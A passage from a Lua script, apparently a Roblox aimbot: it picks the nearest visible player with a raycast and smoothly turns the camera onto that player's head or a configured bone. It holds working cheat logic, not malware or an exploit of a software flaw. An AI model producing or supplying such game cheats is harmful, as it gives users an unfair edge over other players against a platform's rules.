                                    local hit = workspace:FindPartOnRayWithIgnoreList(ray, { LP.Character, p.Character })
                                    if not hit then dist = d; closest = p end
                                else
                                    dist = d; closest = p
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if closest and closest.Character then
        local part = closest.Character:FindFirstChild(CFG.bone) or closest.Character:FindFirstChild("Head")
        if part then
            local goal = CFrame.new(camPos, part.Position)
            Camera.CFrame = Camera.CFrame:Lerp(goal, 1 - CFG.smooth)
        end
    end
end)
